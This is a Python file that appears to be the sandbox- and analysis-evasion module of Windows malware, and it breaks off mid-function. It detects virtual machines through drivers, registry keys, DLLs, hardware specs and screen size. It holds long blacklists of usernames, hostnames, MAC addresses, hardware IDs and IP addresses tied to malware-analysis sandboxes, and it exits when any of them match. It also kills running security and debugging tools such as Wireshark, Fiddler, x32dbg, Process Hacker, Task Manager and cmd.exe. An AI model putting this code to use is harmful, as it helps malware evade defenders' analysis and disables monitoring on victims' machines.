import os
import platform
import socket
import uuid
import subprocess
import psutil
import requests
import winreg
import getpass
import getmac
import ctypes
from ctypes import wintypes
import logging

logging.basicConfig(filename="detection_log.txt", level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

checks_config = {
    1: {"name": "Anti-VM Checks", "enabled": True},
    2: {"name": "User Check", "enabled": True},
    3: {"name": "Hostname Check", "enabled": True},
    4: {"name": "MAC Address Check", "enabled": True},
    5: {"name": "HWID Check", "enabled": True},
    6: {"name": "IP Check", "enabled": True},
    7: {"name": "Registry Check", "enabled": True},
    8: {"name": "DLL Check", "enabled": True},
    9: {"name": "Specs Check", "enabled": True},
    10: {"name": "Process Check", "enabled": True},
}

def exit_with_error(message):
    logging.error(message)
    print(message)
    exit(1)

def anti_vm_check_and_exit():
    if check_for_kvm():
        exit_with_error("VM detection failed: KVM detected")
    if is_screen_small():
        exit_with_error("VM detection failed: Small screen size detected")
    if check_for_qemu():
        exit_with_error("VM detection failed: QEMU detected")
    if task_check():
        exit_with_error("VM detection failed: Suspicious task activity detected")
    if check_for_blacklisted_names():
        exit_with_error("VM detection failed: Blacklisted username detected")
    if vm_artifacts_detect():
        exit_with_error("VM detection failed: VM-related artifacts detected")
    if check_for_sysmon():
        exit_with_error("VM detection failed: Sysmon is running")

def check_for_kvm():
    bad_drivers = [
        "balloon.sys", "netkvm.sys", "vioinput", "viofs.sys", "vioser.sys"
    ]
    system_root = os.getenv("SystemRoot", "C:\\Windows")
    for driver in bad_drivers:
        driver_path = os.path.join(system_root, "System32", driver)
        if os.path.exists(driver_path):
            return True
    return False

def is_screen_small():
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    user32.GetSystemMetrics.restype = ctypes.c_int
    user32.GetSystemMetrics.argtypes = [ctypes.c_int]
    screen_width = user32.GetSystemMetrics(0)
    screen_height = user32.GetSystemMetrics(1)
    return screen_width < 800 or screen_height < 600

def check_for_qemu():
    qemu_drivers = ["qemu-ga", "qemuwmi"]
    system32_path = os.path.join(os.getenv("SystemRoot", "C:\\Windows"), "System32")
    try:
        for file_name in os.listdir(system32_path):
            for driver in qemu_drivers:
                if driver in file_name.lower():
                    return True
    except Exception as e:
        logging.warning(f"Error accessing System32 folder: {e}")
        return False
    return False

def task_check():
    try:
        result = subprocess.run(["tasklist"], capture_output=True, text=True)
        process_counts = {}
        for line in result.stdout.splitlines():
            parts = line.split()
            if len(parts) > 0:
                process_name = parts[0]
                if process_name != "svchost.exe":
                    process_counts[process_name] = process_counts.get(process_name, 0) + 1
        for count in process_counts.values():
            if count > 60:
                return True
    except Exception as e:
        logging.warning(f"Error running tasklist: {e}")
        return False
    return False

def check_for_blacklisted_names():
    blacklisted_names = ["Admin", '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', "johnson", "miller", "malware", "maltest", "currentuser", "sandbox", "virus",
        "john doe", "test user", "sand box", "wdagutilityaccount", "bruno", "george", "harry johnson", 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg', "BEE7370C-8C0C-4",            "DESKTOP-NAKFFMT",  "WIN-5E07COS9ALR",         "B30F0242-1C6A-4",         "DESKTOP-VRSQLAG",            "Q9IATRKPRH",            "XC64ZB",            "DESKTOP-D019GDM",            "DESKTOP-WI8CLET",            "SERVER1",            "LISA-PC",            "JOHN-PC",            "DESKTOP-B0T93D6",            "DESKTOP-1PYKP29",            "DESKTOP-1Y2433R",            "WILEYPC",            "WORK",            "6C4E733F-C2D9-4",            "RALPHS-PC",            "DESKTOP-WG3MYJS",            "DESKTOP-7XC6GEZ",            "DESKTOP-5OV9S0O",            "QarZhrdBpj",            "ORELEEPC",            "ARCHIBALDPC",            "JULIA-PC",            "d1bnJkfVlH",            "WDAGUtilityAccount",          "Abby",            "patex",            "RDhJ0CNFevzX",            "kEecfMwgj",            "Frank",            "8Nl0ColNQ5bq",            "Lisa",            "John",            "george",            "PxmdUOpVyx",            "8VizSM",            "w0fjuOVmCcP5A",            "lmVwjj9b",            "PqONjHVwexsS",            "3u2v9m8",            "Julia",            "HEUeRzl",            "fred",            "server",            "BvJChRPnsxn",            "Harry Johnson",            "SqgFOf3G",            "Lucas",            "mike",            "PateX",            "h7dk1xPr",            "Louise",            "User01",            "test",            "RGzcBUyrznReg",            "OgJb6GqgK0O",
]
    username = os.getenv("USERNAME", "").lower()
    return any(name in username for name in blacklisted_names)

def vm_artifacts_detect():
    bad_files = [
        "VBoxMouse.sys", "VBoxGuest.sys", "VBoxSF.sys", "VBoxVideo.sys",
        "vmmouse.sys", "vboxogl.dll"
    ]
    bad_dirs = [
        "C:\\Program Files\\VMware",
        "C:\\Program Files\\oracle\\virtualbox guest additions"
    ]
    system32_path = os.path.join(os.getenv("SystemRoot", "C:\\Windows"), "System32")
    try:
        for file_name in os.listdir(system32_path):
            if file_name.lower() in [bf.lower() for bf in bad_files]:
                return True
    except Exception as e:
        logging.warning(f"Error accessing System32 folder: {e}")
        return False
    for bad_dir in bad_dirs:
        if os.path.exists(bad_dir):
            return True
    return False

def check_for_sysmon():
    try:
        result = subprocess.run(["tasklist"], capture_output=True, text=True)
        return "sysmon.exe" in result.stdout.lower()
    except Exception as e:
        logging.warning(f"Error running tasklist: {e}")
        return False

def user_check():
    blacklist_users = ['WDAGUtilityAccount' , "johnson", "miller", "malware", "maltest", "currentuser", "sandbox", "virus",
        "john doe", "test user", "sand box", "wdagutilityaccount", "bruno", "george", "harry johnson","Admin", '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg', "BEE7370C-8C0C-4",            "DESKTOP-NAKFFMT",  "WIN-5E07COS9ALR",         "B30F0242-1C6A-4",         "DESKTOP-VRSQLAG",            "Q9IATRKPRH",            "XC64ZB",            "DESKTOP-D019GDM",            "DESKTOP-WI8CLET",            "SERVER1",            "LISA-PC",            "JOHN-PC",            "DESKTOP-B0T93D6",            "DESKTOP-1PYKP29",            "DESKTOP-1Y2433R",            "WILEYPC",            "WORK",            "6C4E733F-C2D9-4",            "RALPHS-PC",            "DESKTOP-WG3MYJS",            "DESKTOP-7XC6GEZ",            "DESKTOP-5OV9S0O",            "QarZhrdBpj",            "ORELEEPC",            "ARCHIBALDPC",            "JULIA-PC",            "d1bnJkfVlH",            "WDAGUtilityAccount",          "Abby",            "patex",            "RDhJ0CNFevzX",            "kEecfMwgj",            "Frank",            "8Nl0ColNQ5bq",            "Lisa",            "John",            "george",            "PxmdUOpVyx",            "8VizSM",            "w0fjuOVmCcP5A",            "lmVwjj9b",            "PqONjHVwexsS",            "3u2v9m8",            "Julia",            "HEUeRzl",            "fred",            "server",            "BvJChRPnsxn",            "Harry Johnson",            "SqgFOf3G",            "Lucas",            "mike",            "PateX",            "h7dk1xPr",            "Louise",            "User01",            "test",            "RGzcBUyrznReg",            "OgJb6GqgK0O",
]
    username = getpass.getuser()
    if username.lower() in blacklist_users:
        exit_with_error("Blacklisted user detected: WDAGUtilityAccount")
    
    blocked_users = ["Admin", '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', "johnson", "miller", "malware", "maltest", "currentuser", "sandbox", "virus",
        "john doe", "test user", "sand box", "wdagutilityaccount", "bruno", "george", "harry johnson", 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg', "BEE7370C-8C0C-4",            "DESKTOP-NAKFFMT",  "WIN-5E07COS9ALR",         "B30F0242-1C6A-4",         "DESKTOP-VRSQLAG",            "Q9IATRKPRH",            "XC64ZB",            "DESKTOP-D019GDM",            "DESKTOP-WI8CLET",            "SERVER1",            "LISA-PC",            "JOHN-PC",            "DESKTOP-B0T93D6",            "DESKTOP-1PYKP29",            "DESKTOP-1Y2433R",            "WILEYPC",            "WORK",            "6C4E733F-C2D9-4",            "RALPHS-PC",            "DESKTOP-WG3MYJS",            "DESKTOP-7XC6GEZ",            "DESKTOP-5OV9S0O",            "QarZhrdBpj",            "ORELEEPC",            "ARCHIBALDPC",            "JULIA-PC",            "d1bnJkfVlH",            "WDAGUtilityAccount",          "Abby",            "patex",            "RDhJ0CNFevzX",            "kEecfMwgj",            "Frank",            "8Nl0ColNQ5bq",            "Lisa",            "John",            "george",            "PxmdUOpVyx",            "8VizSM",            "w0fjuOVmCcP5A",            "lmVwjj9b",            "PqONjHVwexsS",            "3u2v9m8",            "Julia",            "HEUeRzl",            "fred",            "server",            "BvJChRPnsxn",            "Harry Johnson",            "SqgFOf3G",            "Lucas",            "mike",            "PateX",            "h7dk1xPr",            "Louise",            "User01",            "test",            "RGzcBUyrznReg",            "OgJb6GqgK0O",
]
    try:
        user = os.getlogin()
        if user in blocked_users:
            exit_with_error("Blocked user detected: Admin")
    except Exception:
        pass

def hostname_check():
    blacklist_usernames = ['BEE7370C-8C0C-4','DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42'
]
    hostname = socket.gethostname()
    if any(name in hostname for name in blacklist_usernames):
        exit_with_error(f"Blacklisted hostname detected: {hostname}")

def mac_check():
    blacklist_macs = ['00:15:5d:00:07:34', '00:03:47:63:8b:de',"00:0c:29:05:d8:6e",
            '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e'
,    "00:0c:29:2c:c1:21",
                "00:0c:29:52:52:50",
                "00:0d:3a:d2:4f:1f",
                "00:15:5d:00:00:1d",
                "00:15:5d:00:00:a4",
                "00:15:5d:00:00:b3",
                "00:15:5d:00:00:c3",
                "00:15:5d:00:00:f3",
                "00:15:5d:00:01:81",
                "00:15:5d:00:02:26",
                "00:15:5d:00:05:8d",
                "00:15:5d:00:05:d5",
                "00:15:5d:00:06:43",
                "00:15:5d:00:07:34",
                "00:15:5d:00:1a:b9",
                "00:15:5d:00:1c:9a",
                "00:15:5d:13:66:ca",
                "00:15:5d:13:6d:0c",
                "00:15:5d:1e:01:c8",
                "00:15:5d:23:4c:a3",
                "00:15:5d:23:4c:ad",
                "00:15:5d:b6:e0:cc",
                "00:1b:21:13:15:20",
                "00:1b:21:13:21:26",
                "00:1b:21:13:26:44",
                "00:1b:21:13:32:20",
                "00:1b:21:13:32:51",
                "00:1b:21:13:33:55",
                "00:23:cd:ff:94:f0",
                "00:25:90:36:65:0c",
                "00:25:90:36:65:38",
                "00:25:90:36:f0:3b",
                "00:25:90:65:39:e4",
                "00:50:56:97:a1:f8",
                "00:50:56:97:ec:f2",
                "00:50:56:97:f6:c8",
                "00:50:56:a0:06:8d",
                "00:50:56:a0:38:06",
                "00:50:56:a0:39:18",
                "00:50:56:a0:45:03",
                "00:50:56:a0:59:10",
                "00:50:56:a0:61:aa",
                "00:50:56:a0:6d:86",
                "00:50:56:a0:84:88",
                "00:50:56:a0:af:75",
                "00:50:56:a0:cd:a8",
                "00:50:56:a0:d0:fa",
                "00:50:56:a0:d7:38",
                "00:50:56:a0:dd:00",
                "00:50:56:ae:5d:ea",
                "00:50:56:ae:6f:54",
                "00:50:56:ae:b2:b0",
                "00:50:56:ae:e5:d5",
                "00:50:56:b3:05:b4",
                "00:50:56:b3:09:9e",
                "00:50:56:b3:14:59",
                "00:50:56:b3:21:29",
                "00:50:56:b3:38:68",
                "00:50:56:b3:38:88",
                "00:50:56:b3:3b:a6",
                "00:50:56:b3:42:33",
                "00:50:56:b3:4c:bf",
                "00:50:56:b3:50:de",
                "00:50:56:b3:91:c8",
                "00:50:56:b3:94:cb",
                "00:50:56:b3:9e:9e",
                "00:50:56:b3:a9:36",
                "00:50:56:b3:d0:a7",
                "00:50:56:b3:dd:03",
                "00:50:56:b3:ea:ee",
                "00:50:56:b3:ee:e1",
                "00:50:56:b3:f6:57",
                "00:50:56:b3:fa:23",
                "00:e0:4c:42:c7:cb",
                "00:e0:4c:44:76:54",
                "00:e0:4c:46:cf:01",
                "00:e0:4c:4b:4a:40",
                "00:e0:4c:56:42:97",
                "00:e0:4c:7b:7b:86",
                "00:e0:4c:94:1f:20",
                "00:e0:4c:b3:5a:2a",
                "00:e0:4c:b8:7a:58",
                "00:e0:4c:cb:62:08",
                "00:e0:4c:d6:86:77",
                "06:75:91:59:3e:02",
                "08:00:27:3a:28:73",
                "08:00:27:45:13:10",
                "12:1b:9e:3c:a6:2c",
                "12:8a:5c:2a:65:d1",
                "12:f8:87:ab:13:ec",
                "16:ef:22:04:af:76",
                "1a:6c:62:60:3b:f4",
                "1c:99:57:1c:ad:e4",
                "1e:6c:34:93:68:64",
                "2e:62:e8:47:14:49",
                "2e:b8:24:4d:f7:de",
                "32:11:4d:d0:4a:9e",
                "3c:ec:ef:43:fe:de",
                "3c:ec:ef:44:00:d0",
                "3c:ec:ef:44:01:0c",
                "3c:ec:ef:44:01:aa",
                "3e:1c:a1:40:b7:5f",
                "3e:53:81:b7:01:13",
                "3e:c1:fd:f1:bf:71",
                "42:01:0a:8a:00:22",
                "42:01:0a:8a:00:33",
                "42:01:0a:8e:00:22",
                "42:01:0a:96:00:22",
                "42:01:0a:96:00:33",
                "42:85:07:f4:83:d0",
                "4e:79:c0:d9:af:c3",
                "4e:81:81:8e:22:4e",
                "52:54:00:3b:78:24",
                "52:54:00:8b:a6:08",
                "52:54:00:a0:41:92",
                "52:54:00:ab:de:59",
                "52:54:00:b3:e4:71",
                "56:b0:6f:ca:0a:e7",
                "56:e8:92:2e:76:0d",
                "5a:e2:a6:a4:44:db",
                "5e:86:e4:3d:0d:f6",
                "60:02:92:3d:f1:69",
                "60:02:92:66:10:79",
                "7e:05:a3:62:9c:4d",
                "90:48:9a:9d:d5:24",
                "92:4c:a8:23:fc:2e",
                "94:de:80:de:1a:35",
                "96:2b:e9:43:96:76",
                "a6:24:aa:ae:e6:12",
                "ac:1f:6b:d0:48:fe",
                "ac:1f:6b:d0:49:86",
                "ac:1f:6b:d0:4d:98",
                "ac:1f:6b:d0:4d:e4",
                "b4:2e:99:c3:08:3c",
                "b4:a9:5a:b1:c6:fd",
                "b6:ed:9d:27:f4:fa",
                "be:00:e5:c5:0c:e5",
                "c2:ee:af:fd:29:21",
                "c8:9f:1d:b6:58:e4",
                "ca:4d:4b:ca:18:cc",
                "d4:81:d7:87:05:ab",
                "d4:81:d7:ed:25:54",
                "d6:03:e4:ab:77:8e",
                "ea:02:75:3c:90:9f",
                "ea:f6:f1:a2:33:76",
                "f6:a5:41:31:b2:78",]
    mac_address =  str(getmac.get_mac_address())
    if mac_address in blacklist_macs:
        exit_with_error(f"Blacklisted MAC address detected: {mac_address}")

def hwid_check():
    hwids = ['7AB5C494-39F5-4941-9163-47F54D6D5016',    "03DE0294-0480-05DE-1A06-350700080009",
            "11111111-2222-3333-4444-555555555555",
            "6F3CA5EC-BEC9-4A4D-8274-11168F640058",
            "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
            "4C4C4544-0050-3710-8058-CAC04F59344A",
            "00000000-0000-0000-0000-AC1F6BD04972",
            "00000000-0000-0000-0000-000000000000",
            "5BD24D56-789F-8468-7CDC-CAA7222CC121",
            "49434D53-0200-9065-2500-65902500E439",
            "49434D53-0200-9036-2500-36902500F022",
            "777D84B3-88D1-451C-93E4-D235177420A7",
            "49434D53-0200-9036-2500-369025000C65",
            "B1112042-52E8-E25B-3655-6A4F54155DBF",
            "00000000-0000-0000-0000-AC1F6BD048FE",
            "EB16924B-FB6D-4FA1-8666-17B91F62FB37",
            "A15A930C-8251-9645-AF63-E45AD728C20C",
            "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3",
            "C7D23342-A5D4-68A1-59AC-CF40F735B363",
            "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
            "44B94D56-65AB-DC02-86A0-98143A7423BF",
            "6608003F-ECE4-494E-B07E-1C4615D1D93C",
            "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
            "49434D53-0200-9036-2500-369025003AF0",
            "8B4E8278-525C-7343-B825-280AEBCD3BCB",
            "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
            "79AF5279-16CF-4094-9758-F88A616D81B4",
            "FF577B79-782E-0A4D-8568-B35A9B7EB76B",
            "08C1E400-3C56-11EA-8000-3CECEF43FEDE",
            "6ECEAF72-3548-476C-BD8D-73134A9182C8",
            "49434D53-0200-9036-2500-369025003865",
            "119602E8-92F9-BD4B-8979-DA682276D385",
            "12204D56-28C0-AB03-51B7-44A8B7525250",
            "63FA3342-31C7-4E8E-8089-DAFF6CE5E967",
            "365B4000-3B25-11EA-8000-3CECEF44010C",
            "D8C30328-1B06-4611-8E3C-E433F4F9794E",
            "00000000-0000-0000-0000-50E5493391EF",
            "00000000-0000-0000-0000-AC1F6BD04D98",
            "4CB82042-BA8F-1748-C941-363C391CA7F3",
            "B6464A2B-92C7-4B95-A2D0-E5410081B812",
            "BB233342-2E01-718F-D4A1-E7F69D026428",
            "9921DE3A-5C1A-DF11-9078-563412000026",
            "CC5B3F62-2A04-4D2E-A46C-AA41B7050712",
            "00000000-0000-0000-0000-AC1F6BD04986",
            "C249957A-AA08-4B21-933F-9271BEC63C85",
            "BE784D56-81F5-2C8D-9D4B-5AB56F05D86E",
            "ACA69200-3C4C-11EA-8000-3CECEF4401AA",
            "3F284CA4-8BDF-489B-A273-41B44D668F6D",
            "BB64E044-87BA-C847-BC0A-C797D1A16A50",
            "2E6FB594-9D55-4424-8E74-CE25A25E36B0",
            "42A82042-3F13-512F-5E3D-6BF4FFFD8518",
            "38AB3342-66B0-7175-0B23-F390B3728B78",
            "48941AE9-D52F-11DF-BBDA-503734826431",
            "A7721742-BE24-8A1C-B859-D7F8251A83D3",
            "3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E",
            "D2DC3342-396C-6737-A8F6-0C6673C1DE08",
            "EADD1742-4807-00A0-F92E-CCD933E9D8C1",
            "AF1B2042-4B90-0000-A4E4-632A1C8C7EB1",
            "FE455D1A-BE27-4BA4-96C8-967A6D3A9661",
            "921E2042-70D3-F9F1-8CBD-B398A21F89C6",
            "6AA13342-49AB-DC46-4F28-D7BDDCE6BE32",
            "F68B2042-E3A7-2ADA-ADBC-A6274307A317",
            "07AF2042-392C-229F-8491-455123CC85FB",
            "4EDF3342-E7A2-5776-4AE5-57531F471D56",
            "032E02B4-0499-05C3-0806-3C0700080009",]
    try:
        hwid = (
            subprocess.check_output(
                r"wmic csproduct get uuid", creationflags=0x08000000
            )
            .decode()
            .split("\n")[1]
            .strip()
        )
        if hwid in hwids:
            exit_with_error(f"Blacklisted HWID detected: {hwid}")
    except Exception:
        pass

def ip_check():
    try:
        blacklist_ips = ['None',  "88.132.231.71",
                "78.139.8.50",
                "20.99.160.173",
                "88.153.199.169",
                "84.147.62.12",
                "194.154.78.160",
                "92.211.109.160",
                "195.74.76.222",
                "188.105.91.116",
                "34.105.183.68",
                "92.211.55.199",
                "79.104.209.33",
                "95.25.204.90",
                "34.145.89.174",
                "109.74.154.90",
                "109.145.173.169",
                "34.141.146.114",
                "212.119.227.151",
                "195.239.51.59",
                "192.40.57.234",
                "64.124.12.162",
                "34.142.74.220",
                "188.105.91.173",
                "109.74.154.91",
                "34.105.72.241",
                "109.74.154.92",
                "213.33.142.50",
                "109.74.154.91",
                "93.216.75.209",
                "192.87.28.103",
                "88.132.226.203",
                "195.181.175.105",
                "88.132.225.100",
                "92.211.192.144",
                "34.83.46.130",
                "188.105.91.143",
                "34.85.243.241",
                "34.141.245.25",
                "178.239.165.70",
                "84.147.54.113",
                "193.128.114.45",
                "95.25.81.24",
                "92.211.52.62",
                "88.132.227.238",
                "35.199.6.13",
                "80.211.0.97",
                "34.85.253.170",
                "23.128.248.46",
                "35.229.69.227",
                "34.138.96.23",
                "192.211.110.74",
                "35.237.47.12",
                "87.166.50.213",
                "34.253.248.228",
                "212.119.227.167",
                "193.225.193.201",
                "34.145.195.58",
                "34.105.0.27",
                "195.239.51.3",
                "35.192.93.107",
                "213.33.190.22",
                "194.154.78.152",
]
        ip = requests.get("https://api.myip.com").json()["ip"]
        if ip in blacklist_ips:
            exit_with_error(f"Blacklisted IP detected: {ip}")
    except Exception:
        pass

def registry_check():
    try:
        reg1 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul"
        )
        reg2 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
        )
        if reg1 != 1 and reg2 != 1:
            exit_with_error("VM detected in registry")

        handle = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
        )
        try:
            reg_val = winreg.QueryValueEx(handle, "0")[0]
            if "VMware" in reg_val or "VBOX" in reg_val:
                exit_with_error("VM detected in registry")
        finally:
            winreg.CloseKey(handle)
    except Exception:
        pass

def dll_check():
    vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
    virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")
    if os.path.exists(vmware_dll) or os.path.exists(virtualbox_dll):
        exit_with_error("VM detected through DLLs")

def specs_check():
    try:
        ram = psutil.virtual_memory().total / (1024 ** 3)
        disk = psutil.disk_usage("/").total / (1024 ** 3)
        cpu_count = psutil.cpu_count()

        if ram <= 2 or disk <= 50 or cpu_count <= 1:
            exit_with_error("System specs too low")
    except Exception:
        pass

def process_check():
    processes = ["http toolkit.exe", "VMwareService.exe", "VMwareTray.exe",  "httpdebuggerui.exe",
                "wireshark.exe",
                "fiddler.exe",
                "charles.exe",
                "regedit.exe",
                "cmd.exe",
                "taskmgr.exe",
                "vboxservice.exe",
                "df5serv.exe",
                "processhacker.exe",
                "vboxtray.exe",
                "vmtoolsd.exe",
                "vmwaretray.exe",
                "ida64.exe",
                "ollydbg.exe",
                "pestudio.exe",
                "vmwareuser",
                "vgauthservice.exe",
                "vmacthlp.exe",
                "x96dbg.exe",
                "vmsrvc.exe",
                "x32dbg.exe",
                "vmusrvc.exe",
                "prl_cc.exe",
                "prl_tools.exe",
                "qemu-ga.exe",
                "joeboxcontrol.exe",
                "ksdumperclient.exe",
                "ksdumper.exe",
                "joeboxserver.exe",
                "xenservice.exe",]
    for proc in psutil.process_iter():
        try:
            if proc.name().lower() in processes:
                proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass

def run_checks():
    results = []
    checks_failed = False

    if checks_config[1]["enabled"]:
        result = anti_vm_check_and_exit()
        results.append(("anti_vm_check_and_exit", result))
        if not result:
            checks_failed = True
    if checks_config[2]["enabled"]:
        result = user_check()
        results.append(("user_check", result))
        if not result:
            checks_failed = True
    if checks_config[3]["enabled"]:
        result = hostname_check()
        results.append(("hostname_check", result))
        if not result:
            checks_failed = True
    if checks_config[4]["enabled"]:
        result = mac_check()
        results.append(("mac_check", result))
        if not result:
